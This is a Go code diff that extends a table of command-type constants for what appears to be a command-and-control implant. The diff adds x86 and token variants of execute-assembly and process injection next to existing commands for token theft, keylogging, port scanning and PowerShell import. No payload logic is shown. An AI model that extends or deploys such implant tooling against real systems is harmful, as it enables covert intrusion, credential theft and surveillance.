@@ -66,29 +66,33 @@ const (
 	CMD_TYPE_PWD          = 39
 	CMD_TYPE_FILE_BROWSE  = 53
 
-	CMD_TYPE_SPAWN_X64            = 44
-	CMD_TYPE_SPAWN_X86            = 1
-	CMD_TYPE_EXECUTE              = 12
-	CMD_TYPE_GETUID               = 27
-	CMD_TYPE_STEAL_TOKEN          = 31
-	CMD_TYPE_PS                   = 32
-	CMD_TYPE_KILL                 = 33
-	CMD_TYPE_DRIVES               = 55
-	CMD_TYPE_RUNAS                = 38
-	CMD_TYPE_MKDIR                = 54
-	CMD_TYPE_RM                   = 56
-	CMD_TYPE_CP                   = 73
-	CMD_TYPE_MV                   = 74
-	CMD_TYPE_REV2SELF             = 28
-	CMD_TYPE_MAKE_TOKEN           = 49
-	CMD_TYPE_PIPE                 = 40
-	CMD_TYPE_PORTSCAN_X86         = 89
-	CMD_TYPE_PORTSCAN_X64         = 90
-	CMD_TYPE_KEYLOGGER            = 101
-	CMD_TYPE_EXECUTE_ASSEMBLY_X64 = 88
-	CMD_TYPE_IMPORT_POWERSHELL    = 37
-	CMD_TYPE_POWERSHELL_PORT      = 79
-	CMD_TYPE_INJECT_X64           = 43
+	CMD_TYPE_SPAWN_X64                  = 44
+	CMD_TYPE_SPAWN_X86                  = 1
+	CMD_TYPE_EXECUTE                    = 12
+	CMD_TYPE_GETUID                     = 27
+	CMD_TYPE_STEAL_TOKEN                = 31
+	CMD_TYPE_PS                         = 32
+	CMD_TYPE_KILL                       = 33
+	CMD_TYPE_DRIVES                     = 55
+	CMD_TYPE_RUNAS                      = 38
+	CMD_TYPE_MKDIR                      = 54
+	CMD_TYPE_RM                         = 56
+	CMD_TYPE_CP                         = 73
+	CMD_TYPE_MV                         = 74
+	CMD_TYPE_REV2SELF                   = 28
+	CMD_TYPE_MAKE_TOKEN                 = 49
+	CMD_TYPE_PIPE                       = 40
+	CMD_TYPE_PORTSCAN_X86               = 89
+	CMD_TYPE_PORTSCAN_X64               = 90
+	CMD_TYPE_KEYLOGGER                  = 101
+	CMD_TYPE_EXECUTE_ASSEMBLY_X64       = 88
+	CMD_TYPE_EXECUTE_ASSEMBLY_X86       = 87
+	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64 = 71
+	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86 = 70
+	CMD_TYPE_IMPORT_POWERSHELL          = 37
+	CMD_TYPE_POWERSHELL_PORT            = 79
+	CMD_TYPE_INJECT_X64                 = 43
+	CMD_TYPE_INJECT_X86                 = 9
 )
 
 func ParseCommandShell(b []byte) (string, []byte, error) {
